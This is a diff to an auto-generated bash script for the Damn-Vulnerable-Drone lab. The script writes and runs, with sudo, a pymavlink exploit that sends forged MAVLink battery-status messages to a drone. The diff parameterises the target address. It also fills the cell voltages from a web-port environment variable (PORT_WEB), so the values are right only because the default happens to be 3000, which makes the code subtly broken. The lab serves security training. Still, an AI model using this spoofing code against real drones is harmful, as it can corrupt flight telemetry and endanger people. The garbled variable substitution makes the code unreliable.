@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Battery-Spoofing.md
-# Created: 2025-11-23 15:43:26
+# Created: 2025-11-23 16:46:38
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
@@ -44,7 +44,7 @@ def create_battery_status():
         battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
         type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
         temperature=300,
-        voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],
+        voltages=[int(os.environ.get('PORT_WEB', '3000')), int(os.environ.get('PORT_WEB', '3000')), int(os.environ.get('PORT_WEB', '3000')), 0, 0, 0, 0, 0, 0, 0],
         current_battery=-1,
         current_consumed=5000,
         energy_consumed=10000,
@@ -70,5 +70,5 @@ if __name__ == "__main__":
 PY
 
 log "[BLOCK 2] type=shell"
-sudo python3 battery-spoof.py 10.13.0.6:14550
+sudo python3 battery-spoof.py ${ATTACKER_SRC}:${PORT_MAVLINK}
 
